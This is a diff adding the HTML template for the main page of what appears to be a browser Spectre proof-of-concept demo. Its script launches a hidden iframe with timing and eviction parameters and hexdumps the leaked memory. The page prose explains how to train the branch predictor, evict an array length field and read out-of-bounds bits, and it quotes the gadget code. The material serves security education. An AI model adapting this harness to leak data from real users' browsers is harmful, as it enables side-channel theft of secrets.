@@ -1,0 +1,213 @@
+{#
+Copyright 2021 Google LLC
+
+Licensed under the Apache License, Version 2.0 (the "License");
+you may not use this file except in compliance with the License.
+You may obtain a copy of the License at
+
+    https://www.apache.org/licenses/LICENSE-2.0
+
+Unless required by applicable law or agreed to in writing, software
+distributed under the License is distributed on an "AS IS" BASIS,
+WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+See the License for the specific language governing permissions and
+limitations under the License.
+#}
+
+{% extends 'base.html' %}
+
+{% block script %}
+
+<script>
+
+function log(msg) {
+  const logDiv = document.getElementById('log');
+  if (logDiv.innerText != '') {
+    logDiv.innerHTML += '<br/>';
+  }
+  logDiv.innerText += msg;
+  const logBox = document.getElementById('logBox');
+  logBox.scrollTop = logBox.scrollHeight;
+}
+
+function hex(val, width) {
+  return ('0'.repeat(width) + val.toString(16)).slice(-width);
+}
+
+function asPrintable(byte) {
+  if (byte < 0x20 || byte >= 0x7f) return '.';
+  return String.fromCharCode(byte);
+}
+
+function update_hexdump(mem, offset) {
+  const hexdumpDiv = document.getElementById('hexdump');
+  const rowLength = 16;
+  for (let idx = 0; idx < mem.length; idx += rowLength) {
+    const row = mem.slice(idx, idx+rowLength);
+    let rowText = `0x${hex(offset+idx, 8)} `;
+    let ascii = ''
+    for (let byteIndex = 0; byteIndex < rowLength; byteIndex++) {
+      const byte = byteIndex < row.length ? row[byteIndex] : 0;
+      rowText += ' ' + hex(byte, 2);
+      ascii += asPrintable(byte);
+    }
+    hexdumpDiv.appendChild(document.createTextNode(rowText + ' ' + ascii));
+    hexdumpDiv.appendChild(document.createElement('br'));
+  }
+}
+
+let retries_left = 0;
+
+window.onmessage = function(event) {
+  switch (event.data.type) {
+    case 'err':
+      log('[!] error: '+event.data.msg);
+      console.log(event.data.extra_data);
+      if (retries_left > 0) {
+        log(`[*] retrying. (${retries_left} retries left)`);
+        setTimeout(()=>runSpectre(retries_left), 50);
+      } else {
+        log(`[!] no retries left`);
+      }
+      break;
+    case 'log':
+      log(event.data.msg);
+      break;
+    case 'memory':
+      log (`[*] leaked ${event.data.mem.length} bytes in ${Math.floor(event.data.time)}ms`);
+      update_hexdump(event.data.mem, event.data.offset)
+      break;
+    default:
+      console.error(`unknown message type ${event.data.type}`);
+      break;
+  }
+}
+
+function delete_iframe() {
+  const iframe = document.getElementById('spectre_frame');
+  if (!iframe) return;
+  iframe.remove();
+}
+
+function runSpectre(retries) {
+  retries_left = retries-1;
+  delete_iframe();
+  const iframe = document.createElement('iframe');
+
+  const params = {
+    l1_reps: document.getElementById('reps').value,
+    cache_threshold: document.getElementById('cache_threshold').value,
+    measurements: document.getElementById('measurements').value,
+    measurement_reps: document.getElementById('measurement_reps').value,
+    stable_timer: document.getElementById('stable_timer').checked,
+    training_reps: document.getElementById('training_reps').value,
+    gadget_loop_reps: document.getElementById('gadget_loop_reps').value,
+    eviction_list_size: document.getElementById('eviction_list_size').value,
+    min_leak_reps: document.getElementById('min_leak_reps').value,
+    max_leak_reps: document.getElementById('max_leak_reps').value,
+    {% if macos %}
+      m1_cpu: document.getElementById('m1_cpu').checked,
+    {% endif %}
+  };
+
+  iframe.src = `{{ frame_origin }}/spectre_frame.html?${new URLSearchParams(params)}`
+  iframe.id = 'spectre_frame';
+  iframe.style.display = 'none';
+  document.body.appendChild(iframe);
+}
+
+function run() {
+  document.getElementById('hexdump').innerHTML = '$ hexdump spectre.mem<br/>';
+  runSpectre(10);
+}
+
+function init() {
+  const prevButton = document.getElementById('prevButton');
+  prevButton.onclick = () => {
+    location = '/memory.html';
+  };
+  prevButton.disabled = false;
+
+  const nextButton = document.getElementById('nextButton');
+  nextButton.onclick = openSurvey;
+  nextButton.disabled = false;
+  nextButton.innerText = 'survey';
+
+  enableParameters('timer', false);
+  enableParameters('memory', false);
+  enableParameters('spectre', true);
+}
+
+function openSurvey() {
+  const params = {
+    'entry.1869544011': document.getElementById('reps').value,
+    'entry.484127336': document.getElementById('cache_threshold').value,
+    'entry.1640482408': document.getElementById('stable_timer').checked,
+    'entry.636464592': document.getElementById('measurements').value,
+    'entry.385171343': document.getElementById('measurement_reps').value,
+    'entry.89687383': document.getElementById('training_reps').value,
+    'entry.903671733': document.getElementById('gadget_loop_reps').value,
+    'entry.391852276': document.getElementById('eviction_list_size').value,
+    'entry.1843308611': document.getElementById('min_leak_reps').value,
+    'entry.823702873': document.getElementById('max_leak_reps').value
+  };
+  window.open(`https://docs.google.com/forms/d/e/1FAIpQLSe9VBbpKhyyyeSzMw8AMWiRI1P4ZJhrH_Jf-VtUohRYwUw9SQ/viewform?${new URLSearchParams(params)}`);
+}
+
+</script>
+
+{% endblock %}
+
+{% block content %}
+
+<div id="contentSplit">
+<div id="contentLeft">
+<div class=center>
+<h1> Spectre Demo </h1>
+<p>
+Finally, the actual Spectre demo. Please check that the previous steps were successful before trying out this demo.
+</p>
+<p>
+Here's what will happen when you click run: first, the code will set up the memory layout.
+It will create a JavaScript array followed by a bunch of <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Uint8Array" target="_blank">Uint8Arrays</a>. The page offset of the JavaScript array is inferred just as on the previous page.
+This tells us the page offsets of all Uint8Arrays too, since they are at a fixed offset behind the JavaScript array.
+</p>
+<p>
+The internal object of a Uint8Array stores a length field and a pointer to the data. We choose one of the arrays so that these two fields are on separate cache lines. This will allow us to flush the length from the cache but still follow the pointer to the backing store during speculative execution. This is why we need to know the page offset.
+</p>
+
+<p>
+The gist of the Spectre gadget to leak a single bit looks like this:
+<div class="js-code">  <span class="js-keyword">const</span> secretBit = (spectreArray[idx]&#x3E;&#x3E;bit)&#x26;<span class="js-constant">1</span>;
+  <span class="js-keyword">return</span> probeArray[secretBit*<span class="js-constant">0x800</span>];</div>
+The code accesses a Uint8Array, masks out a single bit and then uses it to access a probe array.
+If the bit was 0, the probe array will be accessed at offset 0, otherwise it will be accessed at offset 0x800. We can test for either access using our L1 timer.
+</p>
+<p>
+The full flow will look like this:
+<ul>
+  <li>Run the gadget a few times using an index that is in bounds of the array to train the branch predictor.</li>
+  <li>Evict the array's length field from the cache. The next time we call the gadget, the CPU will speculate that the length check will be successful.</li>
+  <li>Run the gadget using an out of bounds index and use the L1 timer to leak the bit.</li>
+</ul>
+</p>
+<p>
+If it worked, you will see a hex dump of the memory on the right. The Uint8Arrays are filled with 0x20 A's each. The result will be noisy, but the A's should be visible clearly. You can reduce the noise using the minimum and maximum Spectre gadget runs option.
+After running the demo, consider publishing your results using the button on the bottom.
+</p>
+<p>
+<button onclick="run()" class="runButton">run</button>
+</p>
+<h3>Options</h3>
+<table id="paramTable"></table>
+</div>
+</div>
+<div id="contentRight" class="graphContainer">
+  <div id="spectreOut">
+    <div id="logBox" class="termBox"><div id="log" class="term">$ tail -f spectre.log</div></div>
+    <div id="hexdumpBox" class="termBox"><div id="hexdump" class="term">$ hexdump spectre.mem<br/></div></div>
+  </div>
+</div>
+</div>
+
+{% endblock %}
